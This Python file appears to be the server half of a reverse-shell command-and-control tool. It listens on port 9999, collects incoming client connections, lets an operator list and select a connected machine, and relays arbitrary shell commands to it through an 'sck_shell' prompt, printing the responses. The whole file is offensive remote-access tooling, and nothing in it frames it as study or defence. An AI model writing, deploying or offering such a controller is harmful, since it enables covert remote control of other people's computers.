import socket
import sys
import threading
import time
from queue import Queue

class CreateSocket():
    def __init__(self, host = "localhost"):

        self.host = host
        self.port = 9999
        self.max_connections = 5

        self.number_of_threads = 2
        self.job_number = [1, 2]
        self.queue = Queue()
        self.all_connections = []
        self.all_addresses = []

        try:

            self.sck = socket.socket()
            
        except socket.error as msg:
            
            print(f"[-] Socket creation error: {msg}")

    def binding_socket(self):
        """ Binding the socket and listening for connections """

        try:

            self.sck.bind((self.host, self.port))
            self.sck.listen(self.max_connections)

        except socket.error as msg:

            print(f"[-]Socket binding error: {msg}")
            print("Retrying ...")
            
            # Retries recursively
            
            self.binding_socket()

    def socket_accept(self):
        """ Accept connections from clients.
            First close previous connections when server is restarted.
        """

        for connection in self.all_connections:
            connection.close()

        del self.all_connections[:]
        del self.all_addresses[:]

        while True:
            
            try:
                conn, address = self.sck.accept()
                # Prevents server timeout
                self.sck.setblocking(True)

                self.all_connections.append(conn)
                self.all_addresses.append(address)

                print("[+] Connection has been established: " + address[0])
                
            except:
                print("[-] Error accepting connections")
                break

    def start_shell(self):
        """ Creates a shell """

        while True:
            try:
                cmd = input("sck_shell>> ")
                if cmd == "list":
                    self.list_connections()
        
                elif "select" in cmd:
                    conn = self.get_target(cmd)
                    
                    if conn is not None:
                        self.send_target_commands(conn)
        
                    else:
                        print("[-] Command not recognized")
                        
                elif "quit" in cmd:
                    print("Closing the shell")
                    self.sck.close()
                    sys.exit()
                    
            except:
                print("Couldn't start the shell")
                

    def list_connections(self):
        results = ""
        
        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(" "))
                conn.recv(20480)
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                continue
                
            results = str(i) + " " + str(self.all_addresses[i][0] + " " + str(self.all_addresses[i][1]) + "\n")
            
            print("---- Clients ----" + "\n" + results)

    def get_target(self, cmd):
        
        try:
            # We get the number of the client
            target = cmd.replace("select ", "")
            target = int(target)
            conn = self.all_connections[target]
            print(f"You are now connected to: {str(self.all_addresses[target][0])}")
            
            print(str(self.all_addresses[target][0]) + ">", end = "")
            return conn
        except:
            print("Selection not valid")
            return None

    def send_target_commands(self, conn):
        """ Sending commands to the client """

        while True:
            # Allows to send more than one command to the client
            
            try:
                print("Enter command >> ", end = "")
                cmd = input()
                
                # Close connection
                
                if cmd == "quit":
                    # Send it also to the client to close
                    
                    print("Closing the connection")
                    conn.send(str.encode(cmd))
                    conn.close()
                    self.sck.close()
                    sys.exit()
                    
                    

                if len(str.encode(cmd)) > 0:
                    # The Server has entered a command
                    
                    print(f"[+] Server asks: {cmd}")
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(20480), "utf-8")
                    print(f"[+] Client says: {client_response}")
                
            except:
                print("[-] Error sending commands")
                break
            

    def create_workers(self):
        
        for _ in range(self.number_of_threads):
            t = threading.Thread(target = self.work)
            t.daemon = True
            t.start() 
    
    def work(self):
        while True:
            x = self.queue.get()
            if x == 1:
                #CreateSocket()
                self.binding_socket()
                self.socket_accept()
            
            elif x == 2:
                self.start_shell()
                
        self.queue.task_done()
            
    def create_jobs(self):
        for x in self.job_number:
            self.queue.put(x)
            
        self.queue.join()
        
if __name__ == "__main__":
    sck = CreateSocket()
    sck.create_workers()
    sck.create_jobs()

        
    
